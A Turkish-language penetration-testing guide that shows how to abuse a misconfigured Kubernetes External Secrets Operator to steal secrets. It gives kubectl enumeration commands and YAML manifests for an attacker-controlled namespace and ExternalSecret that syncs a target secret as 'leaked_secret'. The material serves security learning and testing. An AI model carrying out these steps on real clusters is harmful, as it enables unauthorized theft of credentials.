# Harici Secret Operatörü

**Bu sayfanın orijinal yazarı** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Bu sayfa, yanlış yapılandırılmış bir ESO'dan veya uygulamanın sırlarını senkronize etmek için ESO kullanan bir uygulamadan sırları nasıl çalabileceğinize dair bazı ipuçları sunar.

## Feragatname

Aşağıda gösterilen teknik, belirli koşullar sağlandığında yalnızca çalışabilir. Örneğin, bir sırrın senkronize edilmesine izin vermek için gereken gereksinimlere bağlıdır. Bu gereksinimleri kendiniz belirlemelisiniz.

## Önkoşullar

1. Yönetici ayrıcalıklarına sahip bir kubernetes / openshift kümesinde bir dayanak noktası
2. En azından küme düzeyinde ExternalSecret'ı okuma erişimine sahip olun
3. ESO'nun sırlarını senkronize etmesine izin veren gerekli etiketlerin / açıklamaların veya grup üyeliğinin olup olmadığını belirleyin. Şanslıysanız, tanımlanan herhangi bir sırrı serbestçe çalabilirsiniz.

### Varolan ClusterSecretStore hakkında bilgi toplama

Bu kaynağı okuma yetkisine sahip olan kullanıcılara sahip olduğunuzu varsayarak; önce mevcut _**ClusterSecretStore**_ listesini alarak başlayın.
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret numaralandırma

Varsayalım ki _**mystore**_ adında bir ClusterSecretStore buldunuz. Devam ederek ilişkili externalsecret'leri numaralandırın.
```sh
kubectl get externalsecret -A | grep mystore
```
_Bu kaynak ad alanı kapsamlı olduğundan, hangi ad alanını arayacağınızı zaten biliyorsanız, tüm ad alanlarını aramak için -A seçeneğini ekleyin._

Tanımlanan externalsecret listesini almalısınız. Varsayalım ki _**mysecret**_ adında bir externalsecret nesnesi buldunuz ve _**mynamespace**_ ad alanı tarafından tanımlanıp kullanılıyor. Tuttuğu gizli bilginin ne tür olduğu hakkında biraz daha bilgi toplayın.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Parçaları birleştirme

Buradan, bir veya birden fazla gizli adının adını alabilirsiniz (Secret kaynağında tanımlandığı gibi). Benzer bir çıktı alacaksınız:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Şimdiye kadar şunlara sahibiz:

* Bir ClusterSecretStore adı
* Bir ExternalSecret adı
* Gizli bilginin adı

Artık ihtiyacımız olan her şeye sahip olduğumuza göre, bir ExternalSecret oluşturabilirsiniz (ve sonunda yeni bir gizli bilginin senkronize edilmesi için gereken ön koşullara uygun bir Namespace oluşturabilirsiniz):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Birkaç dakika sonra, senkronizasyon koşulları karşılandıysa, ad alanınızın içinde sızdırılan sırrı görebilmelisiniz.
```sh
kubectl get secret leaked_secret -o yaml
```
## Referanslar

{% embed url="https://external-secrets.io/latest/" %}

{% embed url="https://github.com/external-secrets/external-secrets" %}
